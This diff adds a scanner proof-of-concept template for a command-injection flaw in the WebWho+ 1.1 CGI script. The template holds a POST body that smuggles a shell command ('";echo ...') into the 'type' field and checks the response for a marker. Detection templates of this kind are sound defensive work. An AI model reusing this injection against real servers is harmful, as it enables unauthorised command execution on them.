@@ -1,0 +1,32 @@
+[info]
+author = "AVE"
+description = "检测 WebWho+ 1.1 中 whois.cgi 的 type 参数命令注入漏洞。CGI 脚本未正确过滤 type 参数中的 shell 元字符，攻击者可通过 POST 请求注入分号和双引号闭合变量，执行任意系统命令。验证方法：发送含 echo 命令标记的 POST 请求，检查响应中是否返回标记字符串。"
+id = "POC-AVE-2000-0011"
+name = "Tony Greenwood WebWho+ 1.1 Remote Command Execution PoC"
+severity = "critical"
+tags = ["ave-2000-0011"]
+vuln_id = [
+    "CVE-2000-0010",
+    "AVE-2000-0011",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/cgi-bin/webwho.pl"
+protocol = "http"
+
+[poc.requests.body]
+content = 'command=X&type=";echo AVE_TEST_2000_0011;echo AVE_END&Check=X'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["AVE_TEST_2000_0011"]
